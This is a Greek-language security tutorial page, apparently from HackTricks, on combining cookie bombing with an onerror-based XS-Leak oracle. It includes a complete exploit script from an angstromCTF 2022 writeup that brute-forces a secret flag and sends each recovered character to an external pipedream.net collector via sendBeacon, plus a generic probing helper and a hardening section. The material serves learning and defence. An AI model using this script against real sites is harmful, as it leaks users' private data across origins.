# Cookie Bomb + Onerror XS Leak

{{#include ../../banners/hacktricks-training.md}}

Αυτή η τεχνική συνδυάζει:
- Cookie bombing: γεμίζοντας τον browser του θύματος με πολλά/μεγάλα cookies για το target origin έτσι ώστε οι επόμενες αιτήσεις να χτυπήσουν όρια του server/του request (π.χ. request header size, URL size σε redirects, κ.λπ.).
- Error-event oracle: εξετάζοντας ένα cross-origin endpoint με ένα <script> (ή άλλο subresource) και διακρίνοντας καταστάσεις χρησιμοποιώντας onload vs onerror.

Κύρια ιδέα
- Βρείτε ένα target endpoint του οποίου η συμπεριφορά διαφέρει για δύο καταστάσεις που θέλετε να δοκιμάσετε (π.χ., αναζήτηση “hit” vs “miss”).
- Βεβαιωθείτε ότι το μονοπάτι “hit” θα προκαλέσει μια βαριά αλυσίδα redirects ή μακρύ URL ενώ το μονοπάτι “miss” παραμένει σύντομο. Φουσκώστε τα request headers χρησιμοποιώντας πολλά cookies ώστε μόνο το μονοπάτι “hit” να προκαλεί αποτυχία του server με HTTP error (π.χ., 431/414/400). Το σφάλμα αντιστρέφει το onerror event και γίνεται oracle για XS-Search.

Πότε λειτουργεί αυτό
- Μπορείτε να προκαλέσετε τον browser του θύματος να στείλει cookies στον στόχο (π.χ., τα cookies έχουν SameSite=None ή μπορείτε να τα ορίσετε σε πρώτο-πλευρικό context μέσω ενός popup window.open).
- Υπάρχει λειτουργία της εφαρμογής που μπορείτε να εκμεταλλευτείτε για να ορίσετε αυθαίρετα cookies (π.χ., endpoints “save preference” που μετατρέπουν ελεγχόμενα ονόματα/τιμές input σε Set-Cookie) ή για να κάνετε post-auth redirects που ενσωματώνουν δεδομένα ελεγχόμενα από τον επιτιθέμενο στο URL.
- Ο server αντιδρά διαφορετικά στις δύο καταστάσεις και, με φουσκωμένα headers/URL, η μία κατάσταση ξεπερνά κάποιο όριο και επιστρέφει ένα error response που προκαλεί onerror.

Σημείωση σχετικά με τα server errors που χρησιμοποιούνται ως oracle
- 431 Request Header Fields Too Large is commonly returned when cookies inflate request headers; 414 URI Too Long or a server-specific 400 may be returned for long request targets. Any of these result in a failed subresource load and fire onerror. [MDN documents 431 and typical causes like excessive cookies.]()

Πρακτικό παράδειγμα (angstromCTF 2022)
Το παρακάτω script (από ένα δημόσιο writeup) εκμεταλλεύεται μια λειτουργία που επιτρέπει στον επιτιθέμενο να εισάγει αυθαίρετα cookies, και στη συνέχεια φορτώνει ένα cross-origin search endpoint ως script. Όταν το query είναι σωστό, ο server εκτελεί ένα redirect που, μαζί με το cookie bloat, ξεπερνά τα όρια του server και επιστρέφει status error, οπότε το script.onerror ενεργοποιείται· διαφορετικά δεν συμβαίνει τίποτα.
```html
<>'";
<form action="https://sustenance.web.actf.co/s" method="POST">
<input id="f" /><input name="search" value="a" />
</form>
<script>
const $ = document.querySelector.bind(document)
const sleep = (ms) => new Promise((r) => setTimeout(r, ms))
let i = 0
const stuff = async (len = 3500) => {
let name = Math.random()
$("form").target = name
let w = window.open("", name)
$("#f").value = "_".repeat(len)
$("#f").name = i++
$("form").submit()
await sleep(100)
}
const isError = async (url) => {
return new Promise((r) => {
let script = document.createElement("script")
script.src = url
script.onload = () => r(false)
script.onerror = () => r(true)
document.head.appendChild(script)
})
}
const search = (query) => {
return isError(
"https://sustenance.web.actf.co/q?q=" + encodeURIComponent(query)
)
}
const alphabet =
"etoanihsrdluc_01234567890gwyfmpbkvjxqz{}ETOANIHSRDLUCGWYFMPBKVJXQZ"
const url = "//en4u1nbmyeahu.x.pipedream.net/"
let known = "actf{"
window.onload = async () => {
navigator.sendBeacon(url + "?load")
await Promise.all([stuff(), stuff(), stuff(), stuff()])
await stuff(1600)
navigator.sendBeacon(url + "?go")
while (true) {
for (let c of alphabet) {
let query = known + c
if (await search(query)) {
navigator.sendBeacon(url, query)
known += c
break
}
}
}
}
</script>
```
Γιατί το popup (window.open)?
- Οι σύγχρονοι browsers μπλοκάρουν ολοένα και περισσότερο τα third-party cookies. Το άνοιγμα ενός top-level window προς τον στόχο κάνει τα cookies first‑party, οπότε οι Set-Cookie απαντήσεις από τον στόχο θα διατηρηθούν, επιτρέποντας το cookie-bomb βήμα ακόμα και με περιορισμούς στα third‑party cookies.

Generic probing helper
Αν ήδη έχετε τρόπο να ορίζετε πολλά cookies στο target origin (first-party), μπορείτε να επαναχρησιμοποιήσετε αυτό το ελάχιστο oracle εναντίον οποιουδήποτε endpoint του οποίου η επιτυχία/αποτυχία οδηγεί σε διαφορετικά αποτελέσματα δικτύου (status/MIME/redirect):
```js
function probeError(url) {
return new Promise((resolve) => {
const s = document.createElement('script');
s.src = url;
s.onload = () => resolve(false);  // loaded successfully
s.onerror = () => resolve(true);  // failed (e.g., 4xx/5xx, wrong MIME, blocked)
document.head.appendChild(s);
});
}
```
Συμβουλές για την κατασκευή του oracle
- Κάντε την “θετική” κατάσταση πιο «βαριά»: αλυσιδώστε ένα επιπλέον redirect μόνο όταν η προϋπόθεση (predicate) είναι true, ή κάντε το redirect URL να αντικατοπτρίζει ανεξέλεγκτη είσοδο χρήστη ώστε να μεγαλώνει με το υποτεθέν πρόθεμα.
- Φουσκώστε τις κεφαλίδες: επαναλάβετε το cookie-bomb μέχρι να παρατηρηθεί ένα συνεπές σφάλμα στη «βαριά» διαδρομή. Οι servers συνήθως ορίζουν όριο στο μέγεθος των header και θα αποτύχουν νωρίτερα όταν υπάρχουν πολλές cookies.
- Σταθεροποιήστε: εκτελέστε πολλαπλές παράλληλες ενέργειες Set-Cookie και ανιχνεύστε επανειλημμένα για να εξομαλύνετε το θόρυβο χρονισμού και caching.

Related XS-Search tricks
- URL length based oracles (no cookies needed) μπορούν να συνδυαστούν ή να χρησιμοποιηθούν ως εναλλακτική όταν μπορείτε να επιβάλετε πολύ μεγάλο request target:

{{#ref}}
url-max-length-client-side.md
{{#endref}}

Αμυντικά μέτρα και σκληροποίηση
- Κάντε τις απαντήσεις επιτυχίας/αποτυχίας αδιακρίτως όμοιες:
- Αποφύγετε conditional redirects ή μεγάλες διαφορές στο μέγεθος της απάντησης μεταξύ καταστάσεων. Επιστρέψτε το ίδιο status, ίδιο Content-Type και παρόμοιο body length ανεξάρτητα από την κατάσταση.
- Αποκλείστε cross-site subresource probes:
- SameSite cookies: ορίστε ευαίσθητα cookies σε SameSite=Lax ή Strict ώστε τα subresource requests όπως <script src> να μην τα μεταφέρουν· προτιμήστε Strict για auth tokens όπου είναι δυνατό.
- Fetch Metadata: επιβάλετε μια Resource Isolation Policy για να απορρίπτετε cross-site subresource loads (π.χ. αν Sec-Fetch-Site != same-origin/same-site).
- Cross-Origin-Resource-Policy (CORP): ορίστε CORP: same-origin (ή τουλάχιστον same-site) για endpoints που δεν προορίζονται να ενσωματωθούν ως cross-origin subresources.
- X-Content-Type-Options: nosniff και σωστό Content-Type σε JSON/HTML endpoints για να αποφύγετε εξαίρετες συμπεριφορές load-as-script.
- Μειώστε την ενίσχυση header/URL:
- Περιορίστε τον αριθμό/μέγεθος των cookies που ορίζονται· καθαρίστε λειτουργίες που μετατρέπουν αυθαίρετα πεδία φορμών σε Set-Cookie.
- Κανονικοποιήστε ή περικόψτε τα ανακλώμενα δεδομένα σε redirects· αποφύγετε την ενσωμάτωση μακρών, ελεγχόμενων από τον attacker, συμβολοσειρών σε Location URLs.
- Κρατήστε τα όρια του server συνεπή και αποτύχετε ομοιόμορφα (αποφύγετε ειδικές σελίδες σφάλματος μόνο για ένα branch).

Σημειώσεις
- Αυτή η κατηγορία επιθέσεων συζητείται γενικά ως “Error Events” XS-Leaks. Το βήμα του cookie-bomb είναι απλώς ένας βολικός τρόπος για να ωθήσετε μόνο ένα branch πέρα από τα όρια του server, παράγοντας ένα αξιόπιστο boolean oracle.



## Αναφορές
- XS-Leaks: Error Events (onerror/onload as an oracle): https://xsleaks.dev/docs/attacks/error-events/
- MDN: 431 Request Header Fields Too Large (συνηθές με πολλές cookies): https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/431
{{#include ../../banners/hacktricks-training.md}}
